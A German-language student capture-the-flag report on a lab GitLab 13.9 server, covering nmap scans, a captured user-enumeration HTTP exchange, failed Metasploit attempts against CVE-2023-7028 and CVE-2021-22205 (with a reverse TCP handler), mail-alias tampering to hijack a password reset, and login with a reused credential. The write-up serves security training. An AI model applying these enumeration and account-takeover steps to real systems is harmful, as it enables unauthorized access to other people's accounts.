---
title: "Cyber2 CTF4-Report"
titlepage: true
author: [Elias Gmünder, Timo Gafner, David Jäggli]
date: "2024-11-21"
keywords: [Markdown, CTF4, Report]
header-includes:
  - \setkeys{Gin}{keepaspectratio}
...

# CTF4 Report 

## Hint

In `/home/stormcloak/.git/config`:

```
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = git@gitlab.robstargames.com:stormcloak/list-of-spies.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
```


## Initial information

### Scans

Scan:
```
nmap -sP 192.168.22.0/24

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-21 16:24 CET
Nmap scan report for Solitude.robstargames.com (192.168.22.4)
Host is up (0.0013s latency).
```

```
sudo nmap -sS solitude.robstargames.com

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-22 13:56 CET
Nmap scan report for solitude.robstargames.com (192.168.22.4)
Host is up (0.00051s latency).
rDNS record for 192.168.22.4: Solitude.robstargames.com
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE  SERVICE
22/tcp   open   ssh
25/tcp   closed smtp
80/tcp   open   http
443/tcp  open   https
3000/tcp closed ppp

Nmap done: 1 IP address (1 host up) scanned in 4.89 seconds
```



### Gitlab

Wenn man die Gitlab Website besucht steht:
`CVE 2021-22205 has been patched successfully.`
Dies ist eine uralte CVE, heisst wahrscheinlich alte Version und neuere CVE's funktionieren eventuell noch. 

Version gefunden mit:

1. Footer
2. Explore
3. Oben richts auf Fragezeichen drücken 
4. "Whats new" -> v13.9.


Vulnerabilities bei dieser Version:
Sign_up user enumeration vulnerability
Mit burp suite -> 'stormcloak' existiert nicht 
Hint von Songtext: 'bully' existiert

Netzwerkkommunikation für diesen Zweck:
Request:
```
GET /users/bully/exists HTTP/2
Host: solitude.robstargames.com
Cookie: experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqWTNPR05tTVRKbUxUTTNaVEF0TkRBMk5TMDVaR1V6TFRVMk5XWm1OakkwWW1ZeE9DST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--38a321bb27ba4ffd3a817cf3a63d72b0b5aa150a; _gitlab_session=42c1ff316c68124ee56d55415b81192d
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126"
X-Csrf-Token: H6ADma8ZcW1B+Pgz2DY2SFRbyj8B9DpHpEL8pLZDdHuBbkFQdDi3rAwTAdZW+bZ26Dnas7YCiajsmc1aYtFBCg==
Accept-Language: en-US
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Accept: application/json, text/plain, */*
X-Requested-With: XMLHttpRequest
Sec-Ch-Ua-Platform: "Linux"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://solitude.robstargames.com/users/sign_up
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
```

Response:
```
HTTP/2 200 OK
Server: nginx
Date: Fri, 22 Nov 2024 09:31:34 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 15
Cache-Control: max-age=0, private, must-revalidate
Etag: W/"8063e5a51719c58189c7d5209a5f37b3"
Page-Title: GitLab
Set-Cookie: _gitlab_session=42c1ff316c68124ee56d55415b81192d; path=/; expires=Fri, 22 Nov 2024 11:31:34 GMT; secure; HttpOnly; SameSite=None
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Frame-Options: DENY
X-Gitlab-Feature-Category: users
X-Permitted-Cross-Domain-Policies: none
X-Request-Id: 01JD9KCSPCX512Q5G76YDY4Q0N
X-Runtime: 0.016192
X-Ua-Compatible: IE=edge
X-Xss-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000
Referrer-Policy: strict-origin-when-cross-origin

{"exists":true}
```

Wenn man versucht einen Account zu registrieren mit bully@robstargames.com:

![email_exists](email_exists.png){ width=70% height=auto }

Bestätigung dass user bully existiert, mit dieser Adresse.





## Exploit Versuche


Eine neuere CVE ist 2023-7028 -> das E-Mail von einem beliebigen User zurücksetzen (zurücksetz-mail wird an custom Mail Addresse geschickt).
Auf Kali einen SMTP Server aufsetzen:
```
sudo python3 -m smtpd -n -c DebuggingServer 0.0.0.0:25
```

Dann auf msf:
```
use auxiliary/admin/http/gitlab_password_reset_account_takeover
```

NOTE: funktioniert nicht!!


Wenn man versucht CVE 2021-22205 (genannt in Banner auf Hauptseite - angeblich gepatcht) in msf auszunutzen steht:

```
msf6 exploit(multi/http/gitlab_exif_rce) > run

[*] Started reverse TCP handler on 192.168.156.158:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Uploading QWipGeZx.jpg to /sc47E16
[-] Exploit aborted due to failure: not-vulnerable: The target is not exploitable. The error response indicates ExifTool was not run. "set ForceExploit true" to override check result.
[*] Exploit completed, but no session was created.
```
-> wurde tatsächlich gepatcht.


### Password reset

Weil bully@robstargames existiert:
- Mails an bugs@robstargames wurden an den Server Riften (192.168.22.65) gesendet. Heisst man könnte versuchen dort User bully zu erstellen, E-Mail Adresse registrieren und dann Passwort mit E-Mail zurücksetzen auf Gitlab website
- `adduser bully`
- `cat /etc/postfix/main.cf`: `alias_database = hash:/etc/aliases`
- `vi /etc/aliases` -> `bully: bully` - to make certain E-Mails at bully are forwarded to the right account/place
- `newaliases` - refresh aliases
- test von kali Maschine: `sendemail -f 69420@asdf.com -t bully@robstargames.com -u "k" -s 192.168.22.65 -m "moin maista" -o tls=no`
- `cat /var/mail/bully` -> message steh drinn (auf Riften Server), lets gooooo
- Passwort reset auf Gitlab anfordern für E-Mail bully@robstargames.com
- E-Mail reset funktioniert nicht (E-Mail kommt nicht an auf Riften) fml


### FML

Zugansdaten bei Gitlab sind gleich wie bei server: bully:Allegiance -_-


### In gitlab

- User bully hat 1 repo: snake game
- Keine öffentlichen repos
- User Paul, Rob und Hans (aus Song) existieren nicht auf gitlab
- Alle MSF module die ich gefunden habe funktionieren nicht bei dieser Version
- Original (verlinkt) snake file in maschine kopieren -> `diff original copy` -> sind genau gleich
- User Administrator hat kein Inhalt, ausser das Default repo

